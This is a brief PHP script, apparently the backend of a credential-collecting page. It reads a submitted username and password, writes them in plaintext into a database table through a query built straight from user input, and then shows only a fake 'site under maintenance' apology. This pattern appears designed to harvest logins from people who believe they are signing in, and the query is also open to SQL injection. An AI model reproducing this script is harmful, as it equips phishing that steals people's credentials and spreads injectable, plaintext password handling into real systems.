<?php

require 'conexion.php';

$usuario=$_POST['nombre'];
$password=$_POST['contra'];

$insertar = "INSERT INTO usu VALUES ('$usuario','$password')";

$query = mysqli_query($conectar,$insertar);

if($query){
    echo "LA PAGINA ESTA EN MANTENIMIENTO POR FAVOR MIL DISCULPAS";
}

?>